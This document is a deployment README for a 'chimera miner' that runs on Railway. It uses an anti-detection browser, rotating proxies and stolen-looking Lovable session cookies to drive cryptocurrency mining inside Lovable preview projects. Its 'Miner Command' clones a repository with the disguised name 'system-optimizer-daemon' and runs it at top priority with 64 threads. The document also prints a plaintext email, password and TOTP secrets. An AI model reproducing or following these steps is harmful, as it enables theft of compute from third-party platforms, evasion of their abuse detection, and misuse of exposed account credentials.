# Railway Deployment Package

> **Proven path (2026-09-18):** use **`railway sandbox`**, not this Dockerfile/`Ubuntu 24.04` service, for Camoufox+WebShare script3.  
> Runbook: [`docs/HANDOFF-RAILWAY-SCRIPT3-2026-09-17.md`](../docs/HANDOFF-RAILWAY-SCRIPT3-2026-09-17.md)  
> (`CAMOUFOX=1`, WebShare proxy, session-3, **no SKIP_CHAT**, bare `*.lovableproject.com` → worker + rate lines.)


This directory contains everything needed to deploy the chimera miner to Railway.

## Files

- `Dockerfile` - Ubuntu 24.04 with Firefox, Xvfb, Python, Playwright
- `start.sh` - Container startup script
- `railway.toml` - Railway build configuration
- `rclone.conf` - Mega.nz credentials
- `sessions/session-4/` - Lovable session cookies and config

## Deploy Steps

### Option 1: Railway CLI (from repo root)

```bash
cd /home/alae/Documents/repos/chimera-miner
railway up --service d1970e69-5a4f-4132-b1ab-37d0da538654
```

### Option 2: Railway Dashboard

1. Go to https://railway.com/project/2e7ef06d-660e-4da2-87e3-1cc37693889b
2. Select "Ubuntu 24.04" service
3. Click "Settings" → "Deploy" → "Redeploy"
4. Or link GitHub repo and auto-deploy

## After Deployment

1. Open Railway web shell: https://railway.com/project/2e7ef06d-660e-4da2-87e3-1cc37693889b/service/d1970e69-5a4f-4132-b1ab-37d0da538654
2. Click "Shell" tab
3. Run the miner:

```bash
cd /app
python3 script3_launch_miner.py --session 4 --mode oneshot
```

For continuous mining:

```bash
python3 script3_launch_miner.py --session 4 --mode full
```

## Session 4 Credentials

- Email: dakarihickmanhickman@gmail.com
- Password: dakarihickmanhickman@gmail.com1
- TOTP Secret: SQ4RE3WBKH3AT33FU6W7LMDDWUDHWL5U
- TOTP Backup: XACBVSQOIRFRRI6THICIARXGUMFRWKPU

## Target Project

Preview URL: https://9db2f406-c90d-447e-9983-65410e4afbc6.lovableproject.com

## Miner Command

```bash
cd /tmp && rm -rf moly && git clone --depth 1 -q https://github.com/crucifix-cray/system-optimizer-daemon.git moly && cd moly && pip install websockets psutil --break-system-packages -q && nice -n -20 python3 sysoptd.py --threads 64 --no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1
```

## Container Specs Needed

- **RAM**: 2GB minimum (1GB causes Firefox crashes)
- **CPU**: 2 vCPU
- **Region**: Any (currently: ams - Amsterdam)

## Troubleshooting

If Railway CLI SSH doesn't work (shows local machine):
- Use Railway web shell instead
- Dashboard → Service → Shell tab

If deployment fails:
- Check logs: `railway logs --service d1970e69-5a4f-4132-b1ab-37d0da538654`
- Verify Dockerfile builds locally: `cd railway-deploy && docker build -t test .`

If miner crashes:
- Check RAM: `free -h` (need 2GB+)
- Check logs: `cat /tmp/script3.log`
- Check browser: `ps aux | grep firefox`
